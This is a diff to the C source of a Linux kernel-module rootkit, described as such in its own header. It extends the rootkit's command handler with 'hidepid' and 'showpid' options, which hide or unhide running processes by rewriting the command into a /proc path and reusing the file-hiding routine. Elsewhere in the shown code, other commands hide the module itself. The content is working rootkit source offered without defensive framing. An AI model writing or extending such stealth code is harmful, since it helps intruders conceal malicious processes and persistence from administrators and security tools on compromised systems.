@@ -9,7 +9,7 @@
 #define LICENCE "GPL"
 #define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
 #define AUTHOR "Benjamin Haag"
-#define VERSION "0.5"
+#define VERSION "0.7"
 
 #define NETLINK_PROTOCOL 31
 
@@ -280,7 +280,7 @@ static char * showfile(const char * file) {
     return "unhide requested file!";
 }
 
-static char * configure(const char * command) {
+static char * configure(char * command) {
     if (strcmp(command, "hidemodule") == 0) {
         hidemodule();
         return "Module is now hidden.";
@@ -294,6 +294,14 @@ static char * configure(const char * command) {
     }
     if (strncmp(command, "showfile ", 9) == 0) {
         return showfile(command+9);
+    }
+    if (strncmp(command, "hidepid ", 8) == 0) {
+        strncpy(command+2,"/proc/",6);
+        return hidefile(command+2);
+    }
+    if (strncmp(command, "showpid ", 8) == 0) {
+        strncpy(command+2,"/proc/",6);
+        return showfile(command+2);
     }
     printk(KERN_INFO "Rootkit: unknown command %s\n", command);
     return "Error: unknowm command";
